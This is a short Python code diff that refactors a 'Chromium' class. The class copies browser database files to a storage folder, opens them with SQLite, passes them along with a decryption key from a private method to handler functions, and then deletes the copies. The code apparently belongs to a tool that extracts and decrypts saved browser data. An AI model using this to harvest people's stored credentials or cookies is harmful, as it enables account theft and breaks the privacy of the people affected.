@@ -130,24 +130,26 @@ class Chromium:
 
                 if item["status"] is True:
 
+                    db = rf"{self.storage_path}\{self.browser_name} {item['name']}.db"
+
                     if path.exists(item["path"]) is True:
-                        copyfile(item["path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
+                        copyfile(item["path"], db)
 
                     elif item["alt_path"] is not None and path.exists(item["alt_path"]):
-                        copyfile(item["alt_path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
+                        copyfile(item["alt_path"], db)
 
                     else:
                         if self.errors is True:
-                            print(f'[{self.browser_name.upper()}]: {item["error"]}')
+                            print(f"[{self.browser_name.upper()}]: {item['error']}")
                         return
 
-                    with connect(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db') as connection:
+                    with connect(db) as connection:
                         connection.text_factory = lambda text: text.decode(errors="ignore")
                         item["method"](connection.cursor(), self.__get_key())
                         connection.cursor().close()
 
                     connection.close()
-                    remove(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
+                    remove(db)
 
             except Exception as e:
 
